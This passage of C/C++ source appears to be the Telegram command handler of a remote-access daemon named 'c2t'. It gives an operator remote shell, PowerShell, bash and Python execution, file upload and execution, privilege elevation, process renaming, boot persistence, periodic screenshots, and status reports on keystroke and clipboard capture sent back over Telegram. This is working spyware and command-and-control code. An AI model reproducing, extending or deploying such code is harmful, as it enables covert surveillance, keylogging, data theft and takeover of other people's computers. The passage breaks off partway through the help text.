        if (preview_resp[0]) {
          telegram_send_html(preview_resp);
        } else {
          telegram_send_html("⚠️ <i>Unable to read file preview.</i>");
        }
      }
    }
    break;
  }

  case CMD_FILEINFO: {
    const char *arg = get_command_argument(text);
    if (!arg || !*arg) {
      telegram_send_html("⚠️ <b>Usage:</b> <code>/fileinfo &lt;path&gt;</code>\n"
                         "<i>Example:</i> <code>/fileinfo /etc/hosts</code>");
    } else {
      char info_resp[1024];
      c2t_log_info("listener",
                   "Querying file info for '%s' on-demand by Telegram command",
                   arg);
      if (c2t_file_get_info(arg, info_resp, sizeof(info_resp))) {
        telegram_send_html(info_resp);
      } else {
        if (info_resp[0]) {
          telegram_send_html(info_resp);
        } else {
          telegram_send_html("⚠️ <i>Unable to retrieve file info.</i>");
        }
      }
    }
    break;
  }

  case CMD_UPLOAD: {
    telegram_send_html(
        "📤 <b>Upload File to Host</b>\n\n"
        "To upload a file to the target host machine:\n"
        "1. Attach and send any file or document in this chat.\n"
        "2. <i>(Optional)</i> Add a caption with the destination path (e.g. "
        "<code>/tmp/dest.txt</code> or <code>C:\\temp\\</code>).\n"
        "3. If no caption is given, the file is saved in the working "
        "directory.\n\n"
        "💡 <i>Use <code>/ls</code> to explore directories or "
        "<code>/getfile</code> to download.</i>");
    break;
  }

  case CMD_SHELL: {
    const char *arg = get_command_argument(text);
    (void)c2t_shell_run_and_send(arg);
    break;
  }

  case CMD_POWERSHELL: {
    const char *arg = get_command_argument(text);
    (void)c2t_shell_run_powershell_and_send(arg);
    break;
  }

  case CMD_BASH: {
    const char *arg = get_command_argument(text);
    (void)c2t_shell_run_bash_and_send(arg);
    break;
  }

  case CMD_CMD: {
    const char *arg = get_command_argument(text);
    (void)c2t_shell_run_cmd_and_send(arg);
    break;
  }

  case CMD_PYTHON: {
    const char *arg = get_command_argument(text);
    (void)c2t_shell_run_python_and_send(arg);
    break;
  }

  case CMD_STDIN: {
    const char *arg = get_command_argument(text);
    if (!arg || !*arg) {
      telegram_send_html(
          "⚠️ <b>Usage:</b> <code>/stdin &lt;command&gt; | &lt;input&gt;</code>\n"
          "<i>Execute command with standard input piped into it.</i>\n\n"
          "<i>Example:</i> <code>/stdin grep keyword | line1\\nkeyword\\nline3</code>");
    } else {
      const char *pipe_sep = strchr(arg, '|');
      if (pipe_sep) {
        char cmd_part[512] = {};
        size_t c_len = (size_t)(pipe_sep - arg);
        if (c_len >= sizeof(cmd_part)) c_len = sizeof(cmd_part) - 1;
        memcpy(cmd_part, arg, c_len);
        cmd_part[c_len] = '\0';
        const char *input_part = pipe_sep + 1;
        while (*input_part && isspace((unsigned char)*input_part)) input_part++;
        (void)c2t_shell_run_with_input_and_send(cmd_part, input_part);
      } else {
        (void)c2t_shell_run_with_input_and_send(arg, nullptr);
      }
    }
    break;
  }

  case CMD_SESSION: {
    const char *arg = get_command_argument(text);
    if (!arg || !*arg) {
      (void)c2t_shell_session_handle_command("help", nullptr);
    } else {
      char sub[64] = {};
      const char *rest = nullptr;
      while (*arg && isspace((unsigned char)*arg)) arg++;
      size_t idx = 0;
      while (*arg && !isspace((unsigned char)*arg) && idx + 1 < sizeof(sub)) {
        sub[idx++] = *arg++;
      }
      sub[idx] = '\0';
      while (*arg && isspace((unsigned char)*arg)) arg++;
      rest = *arg ? arg : nullptr;
      (void)c2t_shell_session_handle_command(sub, rest);
    }
    break;
  }

  case CMD_SESSION_START: {
    const char *arg = get_command_argument(text);
    (void)c2t_shell_session_handle_command("start", arg);
    break;
  }

  case CMD_SESSION_IN: {
    const char *arg = get_command_argument(text);
    (void)c2t_shell_session_handle_command("in", arg);
    break;
  }

  case CMD_SESSION_STOP: {
    const char *arg = get_command_argument(text);
    (void)c2t_shell_session_handle_command("stop", arg);
    break;
  }

  case CMD_SESSION_STATUS: {
    const char *arg = get_command_argument(text);
    (void)c2t_shell_session_handle_command("status", arg);
    break;
  }

  case CMD_RUNFILE: {
    const char *arg = get_command_argument(text);
    if (!arg || !*arg) {
      telegram_send_html(
          "⚠️ <b>Usage:</b> <code>/runfile &lt;filepath&gt; [arguments]</code>\n"
          "<i>Execute an existing script on the host system.</i>\n\n"
          "💡 <i>To upload and run a new script, simply send the script file in this chat with caption <code>/run</code>.</i>");
    } else {
      char path[512] = {};
      const char *args = nullptr;
      while (*arg && isspace((unsigned char)*arg))
        arg++;
      if (*arg == '"' || *arg == '\'') {
        char quote = *arg++;
        size_t idx = 0;
        while (*arg && *arg != quote && idx + 1 < sizeof(path)) {
          path[idx++] = *arg++;
        }
        path[idx] = '\0';
        if (*arg == quote)
          arg++;
        while (isspace((unsigned char)*arg))
          arg++;
        args = *arg ? arg : nullptr;
      } else {
        size_t idx = 0;
        while (*arg && !isspace((unsigned char)*arg) && idx + 1 < sizeof(path)) {
          path[idx++] = *arg++;
        }
        path[idx] = '\0';
        while (isspace((unsigned char)*arg))
          arg++;
        args = *arg ? arg : nullptr;
      }
      (void)c2t_shell_run_script_file_and_send(path, args);
    }
    break;
  }

  case CMD_SHELL_HELP: {
    (void)c2t_shell_output_send_help();
    break;
  }

  case CMD_SHELL_LIVE: {
    const char *arg = get_command_argument(text);
    while (*arg && isspace((unsigned char)*arg))
      arg++;
    (void)c2t_shell_live_start(*arg ? arg : nullptr);
    break;
  }

  case CMD_ELEVATE: {
    char elev_msg[1024] = {};
    (void)c2t_runtime_request_elevation(elev_msg, sizeof(elev_msg));
    telegram_send_html(elev_msg);
    break;
  }

  case CMD_LOGS: {
    c2t_log_info("listener", "Flushing logs on-demand by /logs command");
    c2t_log_sender_dispatch_now();
    break;
  }

  case CMD_SCREENSHOT: {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      const char *arg = get_command_argument(text);
      if (arg && *arg) {
        c2t_log_info("listener",
                     "Capturing desktop screenshot on-demand for display '%s'", arg);
        if (!screenshot_capture_display_and_send(arg, "📸 Desktop Screenshot")) {
          telegram_send_html(
              "⚠️ <b>Screenshot Capture Failed</b>\n<i>Unable to capture target "
              "display on host (check display ID and permissions).</i>");
        }
      } else {
        c2t_log_info("listener",
                     "Capturing desktop screenshot on-demand by Telegram command");
        if (!screenshot_capture_and_send("📸 Desktop Screenshot")) {
          telegram_send_html(
              "⚠️ <b>Screenshot Capture Failed</b>\n<i>Unable to capture desktop "
              "screen on target host (check permissions or active display session).</i>");
        }
      }
    }
    break;
  }

  case CMD_SCREENSHOT_DISPLAYS: {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      char disp_buf[1500];
      (void)screenshot_get_display_list(disp_buf, sizeof(disp_buf));
      telegram_send_html(disp_buf);
    }
    break;
  }

  case CMD_SCREENSHOT_SELECT: {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      const char *arg = get_command_argument(text);
      if (!arg || !*arg) {
        char cur_target[64] = "all";
        screenshot_get_selected_display(cur_target, sizeof(cur_target));
        char resp[512];
        snprintf(resp, sizeof(resp),
                 "🎯 <b>Current Target Display:</b> <code>%s</code>\n\n"
                 "⚠️ <b>Usage:</b> <code>/screenshot_select &lt;id|all&gt;</code>\n"
                 "<i>Example:</i> <code>/screenshot_select 0</code> or <code>/screenshot_select all</code>\n"
                 "<i>Use <code>/screenshot_displays</code> to view available screens.</i>",
                 cur_target);
        telegram_send_html(resp);
      } else {
        (void)screenshot_select_display(arg);
        char resp[512];
        snprintf(resp, sizeof(resp),
                 "🎯 <b>Target Display Updated:</b> <code>%s</code>\n"
                 "<i>Future screenshot captures will target: <b>%s</b></i>",
                 arg, arg);
        telegram_send_html(resp);
      }
    }
    break;
  }

  case CMD_SCREENSHOT_TIMER: {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      const char *arg = get_command_argument(text);
      if (!arg || !*arg) {
        size_t cur = screenshot_get_interval();
        char resp[512];
        snprintf(resp, sizeof(resp),
                 "📸 <b>Periodic Screenshot Timer:</b> %llu s (%s)\n\n"
                 "💡 <b>To change:</b> <code>/screenshot_timer &lt;sec&gt;</code> "
                 "(e.g. <code>/screenshot_timer 60</code> or <code>/screenshot_timer 0</code> to disable)",
                 (unsigned long long)cur, cur > 0 ? "🟢 Enabled" : "⚪ Disabled");
        telegram_send_html(resp);
      } else {
        char *end;
        errno = 0;
        unsigned long val = strtoul(arg, &end, 10);
        if (errno || val > 86400 || (val > 0 && val < 5)) {
          telegram_send_html(
              "⚠️ <b>Invalid Interval:</b> Must be between 5 and 86400 seconds (or 0 to disable).");
        } else {
          screenshot_set_interval((size_t)val);
          char resp[512];
          if (val == 0) {
            snprintf(resp, sizeof(resp),
                     "📸 <b>Periodic Screenshot Timer:</b> ⚪ <b>DISABLED</b>\n"
                     "<i>Screenshots will only be sent on-demand via /screenshot.</i>");
          } else {
            snprintf(resp, sizeof(resp),
                     "📸 <b>Periodic Screenshot Timer:</b> 🟢 <b>ENABLED</b> (%lu s)\n"
                     "<i>A desktop screenshot will automatically be captured and sent every %lu seconds.</i>",
                     val, val);
          }
          telegram_send_html(resp);
        }
      }
    }
    break;
  }

  case CMD_SCREENSHOT_ON: {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      screenshot_set_paused(0);
      telegram_send_html(
          "📸 <b>Screenshot Monitoring:</b> 🟢 <b>RESUMED</b>\n<i>Periodic "
          "screenshot captures are active.</i>");
    }
    break;
  }

  case CMD_SCREENSHOT_OFF: {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      screenshot_set_paused(1);
      telegram_send_html(
          "📸 <b>Screenshot Monitoring:</b> ⏸️ <b>PAUSED</b>\n<i>Periodic "
          "screenshot captures are muted.</i>");
    }
    break;
  }

  case CMD_SCREENSHOT_TOGGLE: {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      int s = screenshot_toggle_paused();
      char resp[256];
      snprintf(resp, sizeof(resp),
               "📸 <b>Screenshot Monitoring:</b> %s",
               s ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b>");
      telegram_send_html(resp);
    }
    break;
  }

  case CMD_SCREENSHOT_FORMAT: {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      const char *arg = get_command_argument(text);
      if (!arg || !*arg) {
        c2t_image_format_t cur_fmt = screenshot_get_format();
        char resp[768];
        snprintf(
            resp, sizeof(resp),
            "📸 <b>Screenshot Format:</b> <code>%s</code> (MIME: <code>%s</code>)\n\n"
            "💡 <b>Supported Formats:</b>\n"
            "• <code>png</code> - Lossless PNG (Compressed, In-App View)\n"
            "• <code>plain</code> - Uncompressed Fast PNG (Lossless, In-App View)\n"
            "• <code>jpg</code> - JPEG Lossy Compression (In-App View)\n"
            "• <code>bmp</code> - Raw Windows Bitmap (Document File)\n"
            "• <code>tga</code> - Truevision TGA (Document File)\n"
            "• <code>hdr</code> - Radiance High Dynamic Range (Document File)\n\n"
            "<b>To change:</b> <code>/screenshot_format &lt;png|plain|jpg|bmp|tga|hdr&gt;</code>",
            screenshot_format_to_string(cur_fmt),
            screenshot_format_mime(cur_fmt));
        telegram_send_html(resp);
      } else {
        c2t_image_format_t new_fmt = screenshot_parse_format(arg);
        screenshot_set_format(new_fmt);
        char resp[512];
        snprintf(
            resp, sizeof(resp),
            "🎯 <b>Screenshot Format Updated:</b> <code>%s</code>\n"
            "• <b>MIME:</b> <code>%s</code>\n"
            "• <b>File:</b> <code>%s</code>\n\n"
            "<i>Future screenshot captures will be encoded in <b>%s</b>.</i>",
            screenshot_format_to_string(new_fmt),
            screenshot_format_mime(new_fmt),
            screenshot_format_filename(new_fmt),
            screenshot_format_to_string(new_fmt));
        telegram_send_html(resp);
      }
    }
    break;
  }

  case CMD_SCREENSHOT_QUALITY: {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      const char *arg = get_command_argument(text);
      if (!arg || !*arg) {
        int cur_q = screenshot_get_quality();
        char resp[512];
        snprintf(
            resp, sizeof(resp),
            "📸 <b>Screenshot Compression Quality:</b> <code>%d%%</code>\n\n"
            "💡 <b>To change:</b> <code>/screenshot_quality &lt;1-100&gt;</code>\n"
            "<i>(Example: <code>/screenshot_quality 90</code> for higher quality or <code>/screenshot_quality 60</code> for smaller size)</i>",
            cur_q);
        telegram_send_html(resp);
      } else {
        char *end;
        errno = 0;
        long val = strtol(arg, &end, 10);
        if (errno || val < 1 || val > 100) {
          telegram_send_html(
              "⚠️ <b>Invalid Quality:</b> Must be an integer between 1 and 100.");
        } else {
          screenshot_set_quality((int)val);
          char resp[512];
          snprintf(
              resp, sizeof(resp),
              "🎯 <b>Screenshot Compression Quality Updated:</b> <code>%ld%%</code>\n"
              "<i>Applies to lossy compression formats (e.g. JPG/JPEG).</i>",
              val);
          telegram_send_html(resp);
        }
      }
    }
    break;
  }

  case CMD_SCREENSHOT_STATUS: {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      char shot_stat[1024];
      screenshot_get_status_info(shot_stat, sizeof(shot_stat));
      telegram_send_html(shot_stat);
    }
    break;
  }

  case CMD_SCREENSHOT_HELP: {
    char shot_help[1400];
    snprintf(
        shot_help, sizeof(shot_help),
        "📸 <b>Screenshot Control Commands</b>\n\n"
        "• <code>/screenshot [id|all]</code> - Capture &amp; send desktop screenshot now\n"
        "• <code>/screenshot_displays</code> (or <code>/screens</code>) - List detected displays &amp; active target\n"
        "• <code>/screenshot_select &lt;id|all&gt;</code> - Select default monitor to capture\n"
        "• <code>/screenshot_format &lt;png|jpg|bmp|plain|tga|hdr&gt;</code> - Set image format (default: png)\n"
        "• <code>/screenshot_quality &lt;1-100&gt;</code> - Set compression quality (default: 85%%)\n"
        "• <code>/screenshot_timer &lt;sec&gt;</code> - Configure periodic capture timer (0 to disable)\n"
        "• <code>/screenshot_on</code> / <code>/screenshot_off</code> - Resume / pause captures\n"
        "• <code>/screenshot_toggle</code> - Toggle active / paused state\n"
        "• <code>/screenshot_status</code> - View screenshot monitor status &amp; backend\n\n"
        "💡 <i>Tip: Multi-monitor setups can target a specific screen (e.g. <code>/screenshot 0</code> or <code>/screenshot all</code>)</i>");
    telegram_send_html(shot_help);
    break;
  }

  case CMD_PROCESS_NAME: {
    const char *arg = get_command_argument(text);
    while (*arg && isspace((unsigned char)*arg))
      arg++;
    if (!*arg) {
      const char *cur_name = config->daemon_name && *config->daemon_name
                                 ? config->daemon_name
                                 : "c2t";
      char escaped_cur[128] = {};
      escape_html_str(cur_name, escaped_cur, sizeof(escaped_cur));
      char resp[512];
      snprintf(
          resp, sizeof(resp),
          "🏷️ <b>Process Name:</b> <code>%s</code>\n\n"
          "💡 <b>To rename:</b> <code>/process_name &lt;new_name&gt;</code> "
          "(or <code>/procname &lt;name&gt;</code>, <code>/rename &lt;name&gt;</code>)",
          escaped_cur);
      telegram_send_html(resp);
    } else {
      char new_name[64] = {};
      size_t nlen = 0;
      while (arg[nlen] && !isspace((unsigned char)arg[nlen]) &&
             nlen + 1 < sizeof(new_name)) {
        new_name[nlen] = arg[nlen];
        nlen++;
      }
      new_name[nlen] = '\0';
      if (nlen == 0) {
        telegram_send_html("⚠️ <b>Invalid Process Name</b>\n<i>Please provide a "
                           "non-empty name.</i>");
      } else {
        c2t_config_set_daemon_name(new_name);
        c2t_runtime_set_process_name(new_name, 0, nullptr);
        c2t_log_info("listener",
                     "Process name changed to '%s' via Telegram command",
                     new_name);
        char escaped_name[128] = {};
        escape_html_str(new_name, escaped_name, sizeof(escaped_name));
        char resp[512];
        snprintf(resp, sizeof(resp),
                 "🏷️ <b>Process Name Updated:</b> <code>%s</code>\n"
                 "<i>Process title and system identity updated.</i>",
                 escaped_name);
        telegram_send_html(resp);
      }
    }
    break;
  }

  case CMD_STATUS: {
    int clip_paused = clipboard_is_paused();
    int key_paused = keyboard_is_paused();
    int shot_paused = screenshot_is_paused();
    int kb_mode = keyboard_get_format_mode();
    char kb_target[128] = "all";
    keyboard_get_selected_target(kb_target, sizeof(kb_target));

    const char *clip_status =
        config->disable_clipboard
            ? "❌ <b>DISABLED</b> (--no-clipboard)"
            : (clip_paused ? "⏸️ <b>PAUSED</b> (Muted)"
                           : "🟢 <b>ACTIVE</b> (Monitoring)");
    const char *kb_status = config->disable_keyboard
                                ? "❌ <b>DISABLED</b> (--no-keyboard)"
                                : (key_paused ? "⏸️ <b>PAUSED</b> (Muted)"
                                              : "🟢 <b>ACTIVE</b> (Capturing)");
    const char *shot_status =
        config->disable_screenshot
            ? "❌ <b>DISABLED</b> (--no-screenshot)"
            : (shot_paused ? "⏸️ <b>PAUSED</b> (Muted)"
                           : "🟢 <b>ACTIVE</b>");

    uint64_t clip_bytes = clipboard_get_total_bytes();
    uint64_t clip_events = clipboard_get_total_events();
    uint64_t kb_bytes = keyboard_get_total_bytes();
    uint64_t kb_keys = keyboard_get_total_keystrokes();
    uint64_t shot_bytes = screenshot_get_total_bytes();
    uint64_t shot_count = screenshot_get_total_captures();
    uint64_t file_bytes = c2t_files_get_total_bytes();
    uint64_t file_count = c2t_files_get_total_files();
    uint64_t log_bytes = c2t_log_sender_get_total_bytes();
    uint64_t log_count = c2t_log_sender_get_total_dispatches();
    uint64_t shell_bytes = c2t_shell_get_total_bytes();
    uint64_t shell_cmds = c2t_shell_get_total_commands();
    uint64_t shell_scripts = c2t_shell_get_total_scripts();
    uint64_t shell_fails = c2t_shell_get_failed_commands();
    uint64_t total_transferred = clip_bytes + kb_bytes + shot_bytes + file_bytes + log_bytes + shell_bytes;

    char shell_status_str[128] = {};
    c2t_shell_get_status_info(shell_status_str, sizeof(shell_status_str));

    char clip_b_str[64] = {}, kb_b_str[64] = {}, shot_b_str[64] = {},
         file_b_str[64] = {}, log_b_str[64] = {}, shell_b_str[64] = {},
         tot_b_str[64] = {};
    format_metric_bytes(clip_bytes, clip_b_str, sizeof(clip_b_str));
    format_metric_bytes(kb_bytes, kb_b_str, sizeof(kb_b_str));
    format_metric_bytes(shot_bytes, shot_b_str, sizeof(shot_b_str));
    format_metric_bytes(file_bytes, file_b_str, sizeof(file_b_str));
    format_metric_bytes(log_bytes, log_b_str, sizeof(log_b_str));
    format_metric_bytes(shell_bytes, shell_b_str, sizeof(shell_b_str));
    format_metric_bytes(total_transferred, tot_b_str, sizeof(tot_b_str));

    char raw_u[64] = {};
    c2t_runtime_get_username(raw_u, sizeof(raw_u));
    char user_acc[128] = {};
    escape_html_str(raw_u, user_acc, sizeof(user_acc));
    const char *priv_lvl = c2t_runtime_get_privilege_str();

    char status_msg[2000];
    snprintf(status_msg, sizeof(status_msg),
             "🤖 <b>c2t Daemon Status</b>\n\n"
             "• <b>Status:</b> 🟢 Active &amp; Running\n"
             "• <b>Privileges:</b> %s\n"
             "• <b>User Account:</b> <code>%s</code>\n"
             "• <b>Clipboard Monitoring:</b> %s\n"
             "• <b>Keyboard Monitoring:</b> %s\n"
             "• <b>Keyboard Target:</b> <code>%s</code> (Mode: %s)\n"
             "• <b>Screenshot Subsystem:</b> %s (Timer: %llu s)\n"
             "• <b>Shell Engine:</b> %s\n"
             "• <b>Periodic Logs:</b> %s (Interval: %llu s)\n"
             "• <b>File Uploads:</b> %s\n"
             "• <b>Window Info:</b> %s\n\n"
             "📊 <b>Data Transferred / Throughput:</b>\n"
             "• <b>Total Data Sent:</b> %s\n"
             "• 📋 <b>Clipboard:</b> %s (%llu events)\n"
             "• ⌨️ <b>Keyboard:</b> %s (%llu keystrokes)\n"
             "• 📸 <b>Screenshots:</b> %s (%llu images)\n"
             "• 💻 <b>Shell Output:</b> %s (%llu cmds, %llu scripts, %llu errs)\n"
             "• 📁 <b>Files:</b> %s (%llu files sent)\n"
             "• 📜 <b>Logs:</b> %s (%llu flushes)\n\n"
             "📦 <b>Queue Limits:</b> %llu items / %llu MB",
             priv_lvl, user_acc,
             clip_status, kb_status, kb_target,
             kb_mode == KEYBOARD_MODE_CODE ? "Code Block" : "Raw Text",
             shot_status, (unsigned long long)screenshot_get_interval(),
             shell_status_str,
             config->telegram_send_logs ? "Enabled" : "On-demand only (/logs)",
             (unsigned long long)config->telegram_log_interval_sec,
             config->telegram_send_files ? "Enabled" : "Disabled",
             config->telegram_send_window_info ? "Enabled" : "Disabled",
             tot_b_str, clip_b_str, (unsigned long long)clip_events, kb_b_str,
             (unsigned long long)kb_keys, shot_b_str,
             (unsigned long long)shot_count, shell_b_str,
             (unsigned long long)shell_cmds, (unsigned long long)shell_scripts,
             (unsigned long long)shell_fails, file_b_str,
             (unsigned long long)file_count, log_b_str,
             (unsigned long long)log_count,
             (unsigned long long)config->queue_max_items,
             (unsigned long long)(config->queue_max_bytes / (1024 * 1024)));
    telegram_send_html(status_msg);
    break;
  }

  case CMD_INFO: {
    (void)telegram_send_start_info();
    break;
  }

  case CMD_RESTART: {
    const char *arg = get_command_argument(text);
    while (*arg && isspace((unsigned char)*arg))
      arg++;
    if (match_command(arg, "keyboard") || match_command(arg, "kb") ||
        match_command(arg, "keys")) {
      restart_subsystem_keyboard();
    } else if (match_command(arg, "clipboard") || match_command(arg, "clip")) {
      restart_subsystem_clipboard();
    } else if (match_command(arg, "screenshot") ||
               match_command(arg, "screen") || match_command(arg, "screens") ||
               match_command(arg, "shot")) {
      restart_subsystem_screenshot();
    } else if (match_command(arg, "logs") || match_command(arg, "log")) {
      restart_subsystem_logs();
    } else if (match_command(arg, "shell") || match_command(arg, "sh") ||
               match_command(arg, "exec") || match_command(arg, "terminal")) {
      restart_subsystem_shell();
    } else if (match_command(arg, "all")) {
      restart_subsystem_all();
    } else if (!*arg || match_command(arg, "daemon") ||
               match_command(arg, "service") || match_command(arg, "process") ||
               match_command(arg, "c2t")) {
      restart_daemon_process(update);
    } else {
      telegram_send_html(
          "⚠️ <b>Usage:</b> <code>/restart [subsystem|all|daemon]</code>\n\n"
          "<b>Supported targets:</b>\n"
          "• <code>/restart keyboard</code> (or <code>/restart_kb</code>) - "
          "Restart keyboard listener &amp; worker\n"
          "• <code>/restart clipboard</code> (or <code>/restart_clip</code>) - "
          "Restart clipboard monitor\n"
          "• <code>/restart screenshot</code> (or <code>/restart_shot</code>) - "
          "Restart screenshot backend &amp; timer\n"
          "• <code>/restart shell</code> (or <code>/restart_shell</code>) - "
          "Terminate sessions &amp; restart shell engine\n"
          "• <code>/restart logs</code> (or <code>/restart_logs</code>) - "
          "Flush and restart log sender\n"
          "• <code>/restart all</code> (or <code>/restart_all</code>) - Reset "
          "all subsystems in-place\n"
          "• <code>/restart daemon</code> (or <code>/restart</code>, "
          "<code>/reboot</code>) - Full process restart");
    }
    break;
  }

  case CMD_RESTART_KEYBOARD: {
    restart_subsystem_keyboard();
    break;
  }

  case CMD_RESTART_CLIPBOARD: {
    restart_subsystem_clipboard();
    break;
  }

  case CMD_RESTART_SCREENSHOT: {
    restart_subsystem_screenshot();
    break;
  }

  case CMD_RESTART_LOGS: {
    restart_subsystem_logs();
    break;
  }

  case CMD_RESTART_SHELL: {
    restart_subsystem_shell();
    break;
  }

  case CMD_RESTART_ALL: {
    restart_subsystem_all();
    break;
  }

  case CMD_INSTALL: {
    const char *arg = get_command_argument(text);
    while (*arg && isspace((unsigned char)*arg))
      arg++;
    if (match_command(arg, "remove") || match_command(arg, "disable") ||
        match_command(arg, "uninstall") || match_command(arg, "off")) {
      char detail[1024] = {};
      (void)c2t_uninstall_autostart(0, detail, sizeof(detail));
      telegram_send_html(detail);
    } else if (match_command(arg, "status") || match_command(arg, "check")) {
      char detail[1024] = {};
      (void)c2t_get_autostart_status(detail, sizeof(detail));
      telegram_send_html(detail);
    } else {
      int system_wide =
          match_command(arg, "system") || match_command(arg, "root");
      char detail[1024] = {};
      (void)c2t_install_autostart(system_wide, detail, sizeof(detail));
      telegram_send_html(detail);
    }
    break;
  }

  case CMD_UNINSTALL: {
    char detail[1024] = {};
    (void)c2t_uninstall_autostart(0, detail, sizeof(detail));
    telegram_send_html(detail);
    break;
  }

  case CMD_AUTOSTART: {
    char detail[1024] = {};
    (void)c2t_get_autostart_status(detail, sizeof(detail));
    telegram_send_html(detail);
    break;
  }

  case CMD_KILL: {
    c2t_log_warning(
        "listener",
        "Complete daemon shutdown initiated by Telegram command '%s'", text);
    telegram_send_html("🛑 <b>c2t Daemon Stopping</b>\n<i>Process termination "
                       "initiated. Good bye!</i>");

    if (update && update->update_id > 0 && config->telegram_bot_token) {
      int64_t ack_offset = update->update_id + 1;
      (void)telegram_poll_updates_callback(config->telegram_bot_token,
                                           &ack_offset, 0, nullptr, nullptr);
    }

    c2t_runtime_request_stop();
    (void)c2t_runtime_stop(1000, 1);
    break;
  }

  case CMD_HELP: {
    /* The complete conditional help is larger than 2 KiB when clipboard,
     * keyboard, and screenshot support are all enabled.  Keep enough room for
     * every section while remaining below Telegram's 4096-character limit. */
    char help_msg[4096];
    size_t h_off = 0;
    static const char help_head[] =
        "💡 <b>c2t Telegram Commands</b>\n\n"
        "<b>Core Controls:</b>\n"
        "• <code>/info</code> (or <code>/start</code>) - View host info &amp; startup summary\n"
        "• <code>/status</code> - View daemon status, privileges &amp; throughput state\n"
        "• <code>/elevate</code> (or <code>/admin</code>, <code>/sudo</code>, <code>/uac</code>) - Request Administrator / root elevation\n"
        "• <code>/process_name [name]</code> (or <code>/rename</code>, <code>/procname</code>) - View or change process name\n"
        "• <code>/install [enable|remove|status]</code> (or <code>/autostart</code>) - Configure startup on boot/login\n"
        "• <code>/uninstall</code> - Remove startup service / registry entry\n"
        "• <code>/restart [subsystem|all|daemon]</code> (or <code>/reset</code>, <code>/reboot</code>) - Restart subsystems or full daemon\n"
        "• <code>/logs</code> - Flush and retrieve execution logs\n"
        "• <code>/pause</code> - Pause all active monitoring\n"
        "• <code>/resume</code> - Resume all active monitoring\n"
        "• <code>/toggle</code> - Toggle pause / resume\n"
        "• <code>/kill</code> - Completely stop and terminate the process\n\n";
    memcpy(help_msg, help_head, sizeof(help_head) - 1);
    h_off = sizeof(help_head) - 1;

    static const char shell_sec[] =
        "<b>Shell &amp; Terminal Execution:</b>\n"
        "• <code>/shell_live [shell]</code> (or <code>/live</code>) - Live interactive terminal mode (no / prefix needed)\n"
        "• <code>/sh &lt;command&gt;</code> - Execute command in default OS shell\n"
        "• <code>/ps &lt;command&gt;</code> - Execute command in PowerShell\n"
        "• <code>/bash &lt;command&gt;</code> - Execute command in GNU Bash\n"
        "• <code>/cmd &lt;command&gt;</code> - Execute command in Command Prompt\n"
        "• <code>/py &lt;code&gt;</code> - Execute inline Python code\n"
        "• <code>/stdin &lt;cmd&gt; | &lt;input&gt;</code> - Execute command with stdin input\n"
        "• <code>/runfile &lt;path&gt; [args]</code> - Execute script file on host\n"
        "• <code>/sh_start [shell]</code> - Launch background interactive session\n"
        "• <code>/sh_in &lt;input&gt;</code> - Send input to running interactive session\n"
        "• <code>/sh_status</code> / <code>/sh_stop</code> - Check or terminate session\n"
        "• <code>/shell_help</code> - Display comprehensive shell guide\n"
        "• <b>Script Upload:</b> Send script (<code>.sh</code>, <code>.bat</code>, <code>.ps1</code>, <code>.py</code>) with caption <code>/run</code>\n\n";
    if (h_off + sizeof(shell_sec) - 1 < sizeof(help_msg)) {
      memcpy(help_msg + h_off, shell_sec, sizeof(shell_sec) - 1);
      h_off += sizeof(shell_sec) - 1;
    }

    if (!config->disable_clipboard) {
      static const char clip_sec[] =
          "<b>Clipboard Controls:</b>\n"
          "• <code>/clipboard_on</code> / <code>/clipboard_off</code> - Enable "
          "/ mute clipboard\n"
          "• <code>/clipboard_toggle</code> - Toggle active / paused state\n"
          "• <code>/clipboard_status</code> - View clipboard monitor &amp; "
          "queue state\n"
          "• <code>/clipboard_flush</code> - Flush queued clipboard items\n"
          "• <code>/clipboard_help</code> - Show full clipboard guide\n\n";
      if (h_off + sizeof(clip_sec) - 1 < sizeof(help_msg)) {
        memcpy(help_msg + h_off, clip_sec, sizeof(clip_sec) - 1);
        h_off += sizeof(clip_sec) - 1;
      }
    }

    if (!config->disable_keyboard) {
      static const char kb_sec[] =
          "<b>Keyboard Controls:</b>\n"
          "• <code>/keyboard_list</code> - View detected keyboard devices\n"
          "• <code>/keyboard_select &lt;id|all&gt;</code> - Select active "
          "keyboard target\n"
          "• <code>/keyboard_layout [code]</code> - View or change keyboard "
          "layout\n"
          "• <code>/keyboard_shortcuts &lt;on|off|toggle&gt;</code> - Toggle "
          "shortcuts capture\n"
          "• <code>/keyboard_on</code> / <code>/keyboard_off</code> - Enable / "
          "mute keyboard\n"
          "• <code>/keyboard_mode &lt;code|raw&gt;</code> - Set code block or "
          "raw mode\n"
